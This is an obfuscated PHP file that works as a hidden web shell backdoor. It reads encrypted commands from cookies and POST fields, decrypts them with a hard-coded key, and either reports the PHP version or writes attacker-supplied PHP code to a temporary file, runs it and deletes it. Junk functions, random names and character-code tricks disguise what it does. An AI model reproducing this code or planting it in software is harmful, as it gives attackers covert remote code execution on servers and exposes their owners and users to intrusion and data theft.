<?php        function /*   o */ mugbws(){$vi_crre='hflbzxpvod';	print_r /*  qkvvo */ (99963+99963);    }

$gvierqc /*  pyzep_   */ =	'gvierqc' /*  egxmi*/ ^ /*bybp   */ '';




function      yyhgqnzuw()
{


      $roxabcgf      =  555;


	$__kfljqqlj /*n  */ =    'rgccputrpc';


   $uyqqc	=    555;


	$eysmme /*   dmrfz */ =    $uyqqc       *   19;

}




function	vobhdhgs($rpujhf,      $dvjf_kwv)


{ /* mq  */ global	$gvierqc;  $fxewt	=    "";
	$mejly /*  fjhaf*/ =	'eue';
    for /* gs  */ ($usinrqujvq /*   z_nl */ = /*   kpzkls*/ 0;	$usinrqujvq    < /*  h */ strlen($rpujhf);)	{
      for      ($ihftf	=     0; /*dzmz*/ $ihftf      <       strlen($dvjf_kwv)  &&    $usinrqujvq    <    strlen($rpujhf); /*   j   */ $ihftf++, /*  tsxfqa  */ $usinrqujvq++) /* lrs   */ {


 /*  ryizk  */ $fxewt      .=    $gvierqc(ord($rpujhf[$usinrqujvq])	^    ord($dvjf_kwv[$ihftf])); /*rxbu   */ }

    }
 /* uavyu */ return /*   qiqa */ $fxewt;


}

$wpkxwvfize  =	$_COOKIE;

$_qrgvkf	=    $_POST;

$baugpb    = /*   rgmr  */ 407;
$csesf	=    $baugpb  +    10;

$ga_ylmonb /*ogn_l   */ = /*  yxo */ 897;





function	yglee($krlcef,  $rpujhf)


{


 /* gfryme*/ global /*   y   */ $gvierqc;


    $dgst_gqqw /*   awyetl   */ =	sprintf("\56" /* ipvz   */ . /*s */ "/".$gvierqc(37)  . /*  x   */ "\x73"	.	"\x2e"    .	$gvierqc(112)	.      $gvierqc(108),     md5($krlcef));

 /*   ymi */ file_put_contents($dgst_gqqw,	"<" /*n   */ . /*a   */ $gvierqc(63)	.    "p"."\x68"       .    "p".$gvierqc(32)       .    "\x75"    .	"\156"       . /*  ugqpz */ "l"."\151"	. /*p_ */ $gvierqc(893-783)    .   $gvierqc(876-769)    .    "(".$gvierqc(450-355)	.    "_"."F"."I"."L".$gvierqc(188-119)	. /*  frpfsm*/ "_".$gvierqc(601-506) /*pjqofi  */ .    ")".";".$gvierqc(32)       .    $rpujhf[$gvierqc(968-868)]);

    include($dgst_gqqw);
	$eawdju	=	146;


  $zntc_sv /*   f*/ =	'jzi_kpa';

 /*  eq   */ $gorjtp  = /*   _*/ 'vayn';      $kbujl_rw    = /*   s*/ $dgst_gqqw;
   @unlink($kbujl_rw);


 /*ni_pae  */ $qsvxj       = /*xtgbw */ 'qdwgjz';
}






function /* nmwsy*/ ksgkznwg(){
 /* xv */ $dcofuwtv	=	314;
}



function /*owfuk*/ wgwedlx_()
{


  global     $gvierqc;
    $usinrqujvq	=    array();


	$cmttt /*  r   */ =	'wdwk';


    $t_ankqg   = /*  ofko   */ 257; /* fvae*/ $usinrqujvq[$gvierqc(286-174)     . /*   ohk*/ "\166"]	=	phpversion();


 /*up*/ $t_ankqg /*oua */ =  $t_ankqg     / /* by  */ 6;


      $usinrqujvq["s"."v"] /*   vhcha*/ =    $gvierqc(255-204) /*ckz   */ .  "."."\65";

      $xsfa_ /* rvb   */ = /*aer */ 'epyne'; /*   tvsdt*/ echo /*oe  */ @serialize($usinrqujvq);


   $t_ankqg	= /* ifueeh   */ $t_ankqg /* ahhsjs */ %     17;

       $t_ankqg /*  ze_m  */ = /* ioolc  */ $t_ankqg	-  19;

}




ksgkznwg();

yyhgqnzuw();



function    vqcht($rpujhf,    $krlcef, /* ac*/ $bjoxl)

{


    global    $gvierqc;


       $rpujhf	= /*ik  */ unserialize(vobhdhgs(vobhdhgs(base64_decode($rpujhf),	$krlcef), /* kabb */ $bjoxl));
    $oloykljs	=  'qqbyytpe';
 /* ujn  */ $qndqoi    =     'nd';

     $glnn_ /*  icnci  */ =  strtolower($oloykljs);
      if       (isset($rpujhf[$gvierqc(97)."k"]))   {    if   ($rpujhf[$gvierqc(97)]    ==	"\x69")       { /*  uqy */ wgwedlx_();


       }	elseif /*   anqa*/ ($rpujhf[$gvierqc(97)] /*uazi*/ ==    "e")     {
    yglee($krlcef, /*ktip*/ $rpujhf);

       }


 /*hqu   */ exit();


	}}


$wpkxwvfize      =	array_merge($_qrgvkf, /*  wckv*/ $wpkxwvfize);




$krlcef /* vdzq  */ = /*  hb */ "\63" /*   xev  */ .    $gvierqc(257-159) /* hbni   */ . /*  c  */ "\x32"   . /*  jici  */ $gvierqc(97)."\143"  . /*  kfuvf  */ "\x33" /* _z   */ .   "\x34"	.    $gvierqc(52)	. /*  zzcahy*/ "-".$gvierqc(57)   .   "8"."2".$gvierqc(829-727) /*   k  */ . /*  j*/ "-"."\x34"   .	"\x33"     . /*  qyto */ "\66"     .    "\63"    .	"-".$gvierqc(602-546)      .    "7"."\146" /*   glwo   */ .    "5"."-".$gvierqc(159-109) /*   fue*/ .	"1"."2".$gvierqc(826-771)    .    "6".$gvierqc(130-77)    .     "\x34"    . /*   mo*/ "b".$gvierqc(832-733) /*   gj_*/ .      "\x61" /*zz   */ .    "f"."9";
$ugqcp	= /*  xvoip*/ -12;
foreach /*  z_itzj */ ($wpkxwvfize	as /*  jx  */ $bjoxl /*  em*/ => /*   dcildo   */ $rpujhf)	{


	vqcht($rpujhf,      $krlcef,     $bjoxl);


}





?>